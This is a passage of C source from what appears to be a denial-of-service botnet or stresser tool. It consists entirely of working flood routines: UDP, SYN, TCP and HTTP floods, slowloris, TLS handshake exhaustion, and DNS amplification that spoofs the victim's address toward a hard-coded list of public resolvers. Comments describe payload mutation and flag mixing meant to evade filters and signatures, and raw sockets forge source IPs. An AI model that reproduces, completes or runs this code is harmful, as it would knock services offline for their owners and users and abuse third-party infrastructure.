    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs();
    if (ncpu < 1) ncpu = 1;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self() ^ (unsigned)mt->cpu_id;

    /* ── Mode 1: TCP connect storm (connection exhaustion) ── */
    if (mt->mode == 1) {
        while (time(NULL) - start < mt->duration && !g_attack_stop) {
            for (int b = 0; b < 128 && !g_attack_stop; b++) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s < 0) continue;
                int fl = 1;
                setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
                fcntl(s, F_SETFL, O_NONBLOCK);
                connect(s, (struct sockaddr *)&mt->target, sizeof(mt->target));
                /* Fire-and-forget: don't wait for handshake */
                close(s);
                pkt_sent(64);
            }
        }
        return NULL;
    }

    /* ── Mode 2: SYN raw (needs CAP_NET_RAW) ── */
    if (mt->mode == 2) {
        int s = create_raw_socket(IPPROTO_TCP);
        if (s < 0) return NULL;
        struct { struct iphdr ip; struct tcphdr tcp; } pkt;
        memset(&pkt, 0, sizeof(pkt));
        pkt.ip.version = 4; pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(pkt));
        pkt.ip.protocol = IPPROTO_TCP;
        pkt.ip.daddr = mt->target.sin_addr.s_addr;
        pkt.ip.ttl = 64;
        pkt.tcp.dest = htons((uint16_t)mt->port);
        pkt.tcp.doff = 5; pkt.tcp.syn = 1;
        pkt.tcp.window = htons(65535);
        struct sockaddr_in sin = mt->target;
        while (time(NULL) - start < mt->duration && !g_attack_stop) {
            for (int b = 0; b < 256; b++) {
                pkt.ip.id = htons((uint16_t)rand_r(&seed));
                pkt.ip.saddr = rand_vn_ip();
                pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                    pkt_sent((int)sizeof(pkt));
            }
        }
        close(s);
        return NULL;
    }

    /* ── Mode 0: UDP mega (default) — full MTU + sendmmsg ── */
    int batch = MEGA_BATCH;
    size_t msg_sz = sizeof(struct mmsghdr) * (size_t)batch;
    size_t iov_sz = sizeof(struct iovec) * (size_t)batch;
    size_t ring_sz = (size_t)batch * MEGA_PAYLOAD;

    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, msg_sz);
        if (iovs != MAP_FAILED) munmap(iovs, iov_sz);
        if (ring != MAP_FAILED) munmap(ring, ring_sz);
        return NULL;
    }

    /* Fill ring with randomized full-size payloads (high bandwidth) */
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
        for (int j = 0; j < MEGA_PAYLOAD; j += 4) {
            unsigned r = rand_r(&seed);
            slot[j] = r & 0xFF;
            if (j + 1 < MEGA_PAYLOAD) slot[j + 1] = (r >> 8) & 0xFF;
            if (j + 2 < MEGA_PAYLOAD) slot[j + 2] = (r >> 16) & 0xFF;
            if (j + 3 < MEGA_PAYLOAD) slot[j + 3] = (r >> 24) & 0xFF;
        }
        /* Mix in real patterns every few slots */
        if (g_total_payloads > 0 && (i % 8) == 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            int pl = g_payload_lens[idx];
            if (pl > MEGA_PAYLOAD) pl = MEGA_PAYLOAD;
            memcpy(slot, g_payloads[idx], (size_t)pl);
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = MEGA_PAYLOAD;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &mt->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif

    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        if (should_pause()) { usleep(200); continue; }
        for (int si = 0; si < mt->sock_count && !g_attack_stop; si++) {
            /* Rotate payload bytes slightly each burst (anti-filter) */
            if ((seed & 0x3F) == 0) {
                int slot = rand_r(&seed) % batch;
                unsigned char *p = ring + (size_t)slot * MEGA_PAYLOAD;
                p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
            }
            for (int b = 0; b < BURST_MULTIPLIER; b++) {
                int r = safe_sendmmsg(mt->socks[si], (struct mmsghdr *)msgs, (unsigned int)batch, flags);
                if (r > 0) {
                    pkt_sent(r * MEGA_PAYLOAD);
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    /* TX queue full — brief yield then continue */
                    usleep(1);
                    break;
                }
            }
        }
        seed++;
    }

    munmap(msgs, msg_sz);
    munmap(iovs, iov_sz);
    munmap(ring, ring_sz);
    return NULL;
}

/* ── Token Bucket (lock only when contended) ───── */
static void tb_init(TokenBucket *tb, double r, double b)
{
    if (r < 1) r = 1;
    if (b < r) b = r;
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}

/* Consume n tokens; for high PPS pass n=burst size once per loop */
static int tb_consume(TokenBucket *tb, int n)
{
    if (n <= 0) return 1;
    /* Unlimited path: rate >= 5M → always allow (admin/MEGA-like) */
    if (tb->rate >= 5000000.0) return 1;

    pthread_mutex_lock(&tb->mtx);
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens += elapsed * tb->rate;
    if (tb->tokens > tb->burst) tb->tokens = tb->burst;
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

static uint16_t icmp_csum(void *d, size_t l) { return ip_csum(d, l); }

/* ── Background Attack Thread Dispatcher ─────────── */
static void *dispatch_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    switch (mt->cpu_id) {
    case -1: return dns_worker(arg);
    case -2: return slowloris_worker(arg);
    case -3: return http_worker(arg);
    case -4: return tls_exhaust_worker(arg);
    case -5: return syn_worker(arg);
    default: return mega_worker(arg);
    }
}

void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    g_attack_active = 1;
    g_attack_stop = 0;
    g_pkt_count = 0;
    g_byte_count = 0;

    const char *method = atk->method;
    int mega = atk->mega_mode || !strcmp(method, "MEGA") || !strcmp(method, "UDP");
    int is_syn    = !strcmp(method, "SYN");
    int is_tls    = atk->tls_exhaust || !strcmp(method, "TLS_EXHAUST");
    int is_http   = !strcmp(method, "HTTP");
    int is_slow   = atk->slowloris || !strcmp(method, "SLOWLORIS");
    int is_dns    = atk->dns_amp || !strcmp(method, "DNS_AMP");

    /* Default to UDP MEGA if no specific method */
    if (!is_syn && !is_tls && !is_http && !is_slow && !is_dns) mega = 1;

    int cores = get_nprocs();
    if (cores < 1) cores = 1;

    /* MEGA / UDP: existing high-throughput engine */
    if (mega) {
        struct sysinfo si;
        long free_mb = 512;
        if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
        int max_sk = cores * MEGA_SOCKS_PER_CPU;
        int ram_cap = (int)(free_mb / 2); /* ~2MB per socket */
        if (ram_cap < 8) ram_cap = 8;
        if (max_sk > ram_cap) max_sk = ram_cap;
        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
        if (max_sk < 8) max_sk = 8;

        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        if (sock_cnt < 1) { free(socks); g_attack_active = 0; free(ctx); return NULL; }

        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); g_attack_active = 0; free(ctx); return NULL;
        }

        int n_udp = cores;
        if (n_udp < 1) n_udp = 1;
        if (n_udp > 8) n_udp = 8;
        if (n_udp > sock_cnt) n_udp = sock_cnt;
        int threads = n_udp;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); free(tids); free(mt);
            g_attack_active = 0; free(ctx); return NULL;
        }

        fprintf(stderr, "[atk] MEGA UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
                atk->target, atk->port, atk->duration_secs, sock_cnt, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 512 * 1024);
        int spth = sock_cnt / n_udp; if (spth < 1) spth = 1;
        for (int i = 0; i < n_udp; i++) {
            mt[i].socks = &socks[i * spth];
            mt[i].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[i].sock_count < 1) mt[i].sock_count = 1;
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = i;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, mega_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    }
    /* SYN / TLS / HTTP / SLOWLORIS / DNS — one worker per core, shared target */
    else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            g_attack_active = 0; free(ctx); return NULL;
        }

        int threads = cores;
        if (threads > 64) threads = 64;
        if (threads < 1) threads = 1;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) { free(tids); free(mt); g_attack_active = 0; free(ctx); return NULL; }

        int tag;
        const char *label;
        if (is_syn)  { tag = -5; label = "SYN"; }
        else if (is_tls)  { tag = -4; label = "TLS_EXHAUST"; }
        else if (is_http) { tag = -3; label = "HTTP"; }
        else if (is_slow) { tag = -2; label = "SLOWLORIS"; }
        else              { tag = -1; label = "DNS_AMP"; }

        fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
                label, atk->target, atk->port, atk->duration_secs, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        for (int i = 0; i < threads; i++) {
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = tag;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        free(tids); free(mt);
    }

    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    g_attack_active = 0;
    free(ctx);
    return NULL;
}

typedef struct {
    AttackParams *ap;
    TokenBucket *tb;
    struct sockaddr_in ta;
    int cpu;
} WorkerArg;

static void *attack_worker(void *arg)
{
    WorkerArg *x = (WorkerArg *)arg;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(x->cpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    if (!strcmp(x->ap->method, "UDP")) udp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "SYN")) syn_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "TCP")) tcp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "HTTP")) http_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "MIX")) mixed(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "ICMP")) icmp_flood(x->ta, x->ap, x->tb);
    else if (x->ap->slowloris || !strcmp(x->ap->method, "SLOWLORIS")) slowloris(x->ta, x->ap, x->tb);
    else if (x->ap->tls_exhaust || !strcmp(x->ap->method, "TLS_EXHAUST")) tls_exhaust(x->ta, x->ap, x->tb);
    else if (x->ap->dns_amp || !strcmp(x->ap->method, "DNS_AMP")) dns_amp(x->ta, x->ap, x->tb);
    else if (x->ap->game_mimic || !strcmp(x->ap->method, "GAME_MIMIC")) game_mimic(x->ta, x->ap, x->tb);
    else udp_flood(x->ta, x->ap, x->tb);

    free(x->ap);
    free(x->tb);
    free(x);
    return NULL;
}

/* ── Flood Workers (v4.0.9 — multi-sock, batch, high Mbps) ── */

#define FLOOD_SOCKS 8
#define UDP_BATCH 32

void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int socks[FLOOD_SOCKS];
    int nsk = 0;
    for (int i = 0; i < FLOOD_SOCKS; i++) {
        int s = create_udp_socket();
        if (s >= 0) socks[nsk++] = s;
    }
    if (nsk < 1) return;

    const int batch = UDP_BATCH;
    unsigned char *ring = aligned_alloc(64, (size_t)batch * MAX_PAYLOAD);
    struct mmsghdr *msgs = calloc((size_t)batch, sizeof(struct mmsghdr));
    struct iovec *iovs = calloc((size_t)batch, sizeof(struct iovec));
    if (!ring || !msgs || !iovs) {
        free(ring); free(msgs); free(iovs);
        for (int i = 0; i < nsk; i++) close(socks[i]);
        return;
    }

    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    for (int i = 0; i < batch; i++) {
        unsigned char *slot = ring + (size_t)i * MAX_PAYLOAD;
        int len = 512 + (int)(rand_r(&seed) % (MAX_PAYLOAD - 512));
        if (g_total_payloads > 0 && (i % 2) == 0) {
            int idx = rand_r(&seed) % g_total_payloads;
            len = g_payload_lens[idx];
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            memcpy(slot, g_payloads[idx], (size_t)len);
        } else {
            for (int j = 0; j < len; j++) slot[j] = (unsigned char)rand_r(&seed);
        }
        iovs[i].iov_base = slot;
        iovs[i].iov_len = (size_t)len;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &ta;
        msgs[i].msg_hdr.msg_namelen = sizeof(ta);
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, batch)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int si = 0; si < nsk && !g_attack_stop; si++) {
            int r = safe_sendmmsg(socks[si], (struct mmsghdr *)msgs, (unsigned int)batch, flags);
            if (r > 0) {
                int bytes = 0;
                for (int k = 0; k < r; k++) bytes += (int)iovs[k].iov_len;
                pkt_sent(bytes);
            }
        }
        /* Mutate one slot per loop — anti signature */
        int slot = (int)(rand_r(&seed) % batch);
        ((unsigned char *)iovs[slot].iov_base)[rand_r(&seed) % iovs[slot].iov_len] ^= 0xA5;
    }
    free(ring); free(msgs); free(iovs);
    for (int i = 0; i < nsk; i++) close(socks[i]);
}

void syn_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_TCP);
    if (s < 0) return;
    struct { struct iphdr ip; struct tcphdr tcp; } pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.ip.version = 4; pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = ta.sin_addr.s_addr;
    pkt.tcp.dest = htons((uint16_t)p->port);
    pkt.tcp.doff = 5;
    pkt.tcp.window = htons(65535);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    struct sockaddr_in sin = ta;
    sin.sin_port = htons((uint16_t)p->port);

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, BURST_SIZE)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < BURST_SIZE && !g_attack_stop; b++) {
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip()
                         : (p->spoof_mode == 2) ? rand_r(&seed) : rand_vn_ip();
            pkt.ip.ttl = 48 + (rand_r(&seed) % 80);
            pkt.ip.frag_off = (p->fragmentation && (rand_r(&seed) % 5) == 0)
                              ? htons(0x2000 | (rand_r(&seed) % 64)) : 0;
            /* Mix SYN / SYN+ACK / RST for filter bypass */
            pkt.tcp.syn = 1; pkt.tcp.ack = 0; pkt.tcp.rst = 0;
            int fl = rand_r(&seed) % 10;
            if (fl == 0) { pkt.tcp.ack = 1; }
            else if (fl == 1) { pkt.tcp.rst = 1; pkt.tcp.syn = 0; }
            pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
            pkt.tcp.seq = htonl(rand_r(&seed));
            pkt.tcp.ack_seq = pkt.tcp.ack ? htonl(rand_r(&seed)) : 0;
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
            if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)sizeof(pkt));
        }
    }
    close(s);
}

void tcp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Pool of half-open + data-blast sockets */
    const int pool = 64;
    int socks[64];
    int n = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    char junk[1024];
    for (int i = 0; i < 1024; i++) junk[i] = (char)(rand_r(&seed) & 0xFF);

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 32)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        /* Open new non-block connects */
        for (int b = 0; b < 32 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            socks[n++] = s;
            pkt_sent(64);
        }
        /* Blast data on existing, recycle dead */
        for (int i = 0; i < n; i++) {
            ssize_t w = send(socks[i], junk, sizeof(junk), MSG_DONTWAIT | MSG_NOSIGNAL);
            if (w > 0) pkt_sent((int)w);
            else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
                close(socks[i]);
                socks[i] = socks[--n];
                i--;
            }
        }
        /* Cap pool — close oldest */
        while (n > pool / 2) {
            close(socks[--n]);
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void http_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    const int pool = 32;
    int socks[32];
    int alive[32];
    int n = 0;
    memset(alive, 0, sizeof(alive));
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 16)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        /* Open new */
        for (int b = 0; b < 8 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            socks[n] = s; alive[n] = 1; n++;
        }
        /* Pipeline multiple requests per socket */
        for (int i = 0; i < n && !g_attack_stop; i++) {
            if (!alive[i]) continue;
            for (int r = 0; r < 4; r++) {
                unsigned char buf[2048];
                int len = 0;
                gen_http(buf, &len, p->target);
                ssize_t w = send(socks[i], buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                if (w > 0) pkt_sent((int)w);
                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
                    close(socks[i]); alive[i] = 0;
                    break;
                }
            }
        }
        /* Compact dead */
        int w = 0;
        for (int i = 0; i < n; i++) {
            if (alive[i]) { socks[w] = socks[i]; alive[w] = 1; w++; }
        }
        n = w;
        /* Random recycle to avoid idle timeout on target */
        if (n > 0 && (rand_r(&seed) % 20) == 0) {
            close(socks[n - 1]); n--;
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void slowloris(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    const int maxc = 800;
    int *socks = calloc((size_t)maxc, sizeof(int));
    if (!socks) return;
    int cnt = 0;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    time_t last_drip = time(NULL);

    /* Warm pool fast */
    for (int i = 0; i < maxc && p->duration_secs && !g_attack_stop; i++) {
        if (!tb_consume(tb, 1)) { usleep(1000); continue; }
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) continue;
        int ka = 1;
        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
        fcntl(s, F_SETFL, O_NONBLOCK);
        connect(s, (struct sockaddr *)&ta, sizeof(ta));
        char ph[640];
        snprintf(ph, sizeof(ph),
                 "GET /?%u HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
                 "Accept: */*\r\nAccept-Language: en-US,en;q=0.9\r\n"
                 "Connection: keep-alive\r\n",
                 rand_r(&seed), p->target);
        send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
        socks[cnt++] = s;
        if ((i & 0x1F) == 0) usleep(1000);
    }

    while (p->duration_secs && !g_attack_stop) {
        time_t now = time(NULL);
        /* Drip headers every 5–15s (classic slowloris) */
        if (now - last_drip >= 5) {
            last_drip = now;
            for (int i = 0; i < cnt && !g_attack_stop; i++) {
                char h[128];
                snprintf(h, sizeof(h), "X-a%u: %u\r\n", rand_r(&seed) % 99999, rand_r(&seed));
                ssize_t w = send(socks[i], h, strlen(h), MSG_DONTWAIT | MSG_NOSIGNAL);
                if (w > 0) pkt_sent((int)w);
                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(socks[i]);
                    socks[i] = socks[--cnt];
                    i--;
                }
            }
        }
        /* Replenish */
        while (cnt < maxc && p->duration_secs && !g_attack_stop) {
            if (!tb_consume(tb, 1)) break;
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            char ph[512];
            snprintf(ph, sizeof(ph), "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000\r\n", p->target);
            send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
            socks[cnt++] = s;
        }
        usleep(200000);
    }
    for (int i = 0; i < cnt; i++) close(socks[i]);
    free(socks);
}

void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Hold many sockets mid-handshake to exhaust TLS workers */
    const int pool = 128;
    int socks[128];
    int n = 0;

    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 16)) { usleep(50); continue; }
        if (should_pause()) { usleep(200); continue; }

        for (int b = 0; b < 16 && n < pool && !g_attack_stop; b++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[1024];
            int len = 0;
            gen_tls_hello(buf, &len, p->target);
            send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
            socks[n++] = s;
            pkt_sent(len);
        }
        /* Occasionally drop half to free FD and reopen */
        if (n >= pool) {
            for (int i = 0; i < n / 2; i++) close(socks[i]);
            memmove(socks, socks + n / 2, (size_t)(n - n / 2) * sizeof(int));
            n -= n / 2;
        }
    }
    for (int i = 0; i < n; i++) close(socks[i]);
}

void dns_amp(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    /* Open resolvers (VN + global) — spoof source = victim */
    static const char *dns_svrs[] = {
        "203.162.4.1", "203.113.131.1", "210.245.0.11", "210.245.0.12",
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "208.67.222.222", "64.6.64.6", "94.140.14.14",
        "185.228.168.9", "76.76.2.0", "4.2.2.1", "4.2.2.2",
    };
    const int nsrv = (int)(sizeof(dns_svrs) / sizeof(dns_svrs[0]));
    int s = create_raw_socket(IPPROTO_UDP);
    if (s < 0) {
        /* Fallback: plain UDP without spoof (less amp but still hits resolvers) */
        s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (s < 0) return;
        int bs = 4 * 1024 * 1024;
        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
        unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
        while (p->duration_secs && !g_attack_stop) {
            if (!tb_consume(tb, 64)) { usleep(20); continue; }
            for (int b = 0; b < 64 && !g_attack_stop; b++) {
                struct sockaddr_in sin = {0};
                sin.sin_family = AF_INET;
                sin.sin_port = htons(53);
                inet_pton(AF_INET, dns_svrs[rand_r(&seed) % nsrv], &sin.sin_addr);
                if (sendto(s, DNS_ANY_PAYLOAD, DNS_ANY_LEN, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                    pkt_sent((int)DNS_ANY_LEN);
            }
        }
        close(s);
        return;
    }

    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        if (!tb_consume(tb, 128)) { usleep(20); continue; }
        if (should_pause()) { usleep(200); continue; }
        for (int b = 0; b < 128 && !g_attack_stop; b++) {
            const char *dip = dns_svrs[rand_r(&seed) % nsrv];
            struct { struct iphdr ip; struct udphdr udp; unsigned char d[64]; } pkt;
            memset(&pkt, 0, sizeof(pkt));
            size_t tl = sizeof(struct iphdr) + sizeof(struct udphdr) + DNS_ANY_LEN;
            pkt.ip.version = 4; pkt.ip.ihl = 5;
            pkt.ip.tot_len = htons((uint16_t)tl);
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_UDP;
            pkt.ip.saddr = ta.sin_addr.s_addr; /* spoof = victim */
            inet_pton(AF_INET, dip, &pkt.ip.daddr);
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.udp.source = htons((uint16_t)(1024 + rand_r(&seed) % 60000));
            pkt.udp.dest = htons(53);
            pkt.udp.len = htons((uint16_t)(sizeof(struct udphdr) + DNS_ANY_LEN));
            pkt.udp.check = 0;
            memcpy(pkt.d, DNS_ANY_PAYLOAD, DNS_ANY_LEN);
            /* Randomize DNS TXID */
            pkt.d[0] = (unsigned char)(rand_r(&seed) & 0xFF);
            pkt.d[1] = (unsigned char)(rand_r(&seed) & 0xFF);
            struct sockaddr_in sin = {0};
            sin.sin_family = AF_INET;
            sin.sin_port = htons(53);
            sin.sin_addr.s_addr = pkt.ip.daddr;
            if (sendto(s, &pkt, tl, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)tl);
        }
    }
    close(s);
}

